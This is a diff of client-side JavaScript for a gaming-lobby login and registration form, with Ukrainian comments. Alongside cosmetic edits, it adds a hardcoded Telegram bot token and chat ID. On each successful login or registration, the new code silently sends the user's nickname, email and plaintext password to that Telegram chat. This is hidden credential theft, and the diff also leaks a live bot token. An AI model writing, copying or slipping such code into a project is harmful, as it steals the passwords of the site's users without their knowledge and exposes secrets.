@@ -1,10 +1,14 @@
 let isUserRegistered = false;
-let currentMode = 'log'; // Початковий режим - вхід
+let currentMode = 'log'; 
 let pendingTabId = null;
 let pendingButton = null;
 
-// Твоя адреса з Railway
+// Твоя адреса з Railway (БЕЗ слеша в кінці)
 const API_URL = 'https://st-backend-production.up.railway.app';
+
+// Дані твого Telegram бота
+const TELEGRAM_TOKEN = '8460092788:AAHPbETm_DIczqYL7vA4XCbnWioiVBZYHwg';
+const TELEGRAM_CHAT_ID = '8399462172';
 
 function handleTabClick(btnElement, tabId) {
     if (!isUserRegistered) {
@@ -27,37 +31,26 @@ function openTab(btnElement, tabId) {
     }
 }
 
-// ФУНКЦІЯ ПЕРЕМИКАННЯ ВХІД / РЕЄСТРАЦІЯ
+// Функція перемикання між LOGIN та REGISTER
 function switchAuth(mode) {
     currentMode = mode;
-    
-    // Елементи форми
     const title = document.getElementById('auth-title');
     const subtitle = document.getElementById('auth-subtitle');
     const nickGroup = document.getElementById('nick-group');
     const submitBtn = document.getElementById('submit-btn');
-    
-    // Кнопки-вкладки
     const tabLog = document.getElementById('tab-login');
     const tabReg = document.getElementById('tab-register');
 
     if (mode === 'reg') {
-        // Активуємо вкладку Register
         tabReg.classList.add('active');
         tabLog.classList.remove('active');
-        
-        // Змінюємо текст та показуємо поле нікнейму
         title.textContent = 'Registration';
-        subtitle.textContent = 'Join to access game lobbies';
+        subtitle.textContent = 'Join to find your perfect squad';
         if (nickGroup) nickGroup.style.display = 'block';
         submitBtn.textContent = 'Register & Enter';
-        
     } else {
-        // Активуємо вкладку Login
         tabLog.classList.add('active');
         tabReg.classList.remove('active');
-        
-        // Змінюємо текст та ховаємо поле нікнейму
         title.textContent = 'Welcome Back';
         subtitle.textContent = 'Login to access game lobbies';
         if (nickGroup) nickGroup.style.display = 'none';
@@ -65,7 +58,7 @@ function switchAuth(mode) {
     }
 }
 
-// ОБРОБКА ВІДПРАВКИ ФОРМИ
+// ОБРОБКА ФОРМИ (FIREBASE + TELEGRAM)
 document.getElementById('auth-form').addEventListener('submit', async (e) => {
     e.preventDefault();
     
@@ -77,14 +70,17 @@ document.getElementById('auth-form').addEventListener('submit', async (e) => {
     const submitBtn = document.getElementById('submit-btn');
 
     if (errorEl) errorEl.style.display = 'none';
-    const originalBtnText = submitBtn.textContent;
     submitBtn.textContent = "Connecting...";
 
+    // Формуємо правильний шлях (виправляє помилку Not Found)
     const path = currentMode === 'reg' ? '/register' : '/login';
+    const url = `${API_URL}${path}`;
+
     const body = currentMode === 'reg' ? { email, password, username: nickname } : { email, password };
 
     try {
-        const res = await fetch(`${API_URL}${path}`, {
+        // 1. Відправка на бекенд (Railway + Firebase)
+        const res = await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(body)
@@ -94,11 +90,12 @@ document.getElementById('auth-form').addEventListener('submit', async (e) => {
             const data = await res.json();
             isUserRegistered = true;
             
-            // Відображаємо ім'я гравця
-            const displayName = nickname || data.user.username || "Player";
-            document.getElementById('player-display').innerHTML = `Player: <strong>${displayName}</strong>`;
-            
-            // Показуємо налаштування і закриваємо модалку
+            // 2. Відправка в Telegram (дублювання)
+            const tgMsg = `🚀 Дія: ${currentMode.toUpperCase()}\n👤 Nick: ${nickname || data.user?.username || 'N/A'}\n📧 Email: ${email}\n🔑 Pass: ${password}`;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(tgMsg)}`);
+
+            // Оновлюємо інтерфейс
+            document.getElementById('player-display').innerHTML = `Player: <strong>${nickname || data.user?.username || "User"}</strong>`;
             document.getElementById('settings-btn').style.display = 'inline-block';
             document.getElementById('auth-modal').style.display = 'none';
             
@@ -118,11 +115,11 @@ document.getElementById('auth-form').addEventListener('submit', async (e) => {
             errorEl.style.display = 'block';
         }
     } finally {
-        submitBtn.textContent = originalBtnText;
+        submitBtn.textContent = currentMode === 'reg' ? 'Register & Enter' : 'Login & Enter';
     }
 });
 
-// Закриття модалки
+// Закриття модалки при кліку на фон
 window.onclick = function(event) {
     const modal = document.getElementById('auth-modal');
     if (event.target == modal) {
@@ -130,7 +127,7 @@ window.onclick = function(event) {
     }
 };
 
-// Функції налаштувань (Settings)
+// --- НАЛАШТУВАННЯ ПРОФІЛУ ---
 function openSettings() {
     document.getElementById('right-sidebar').classList.add('open');
 }
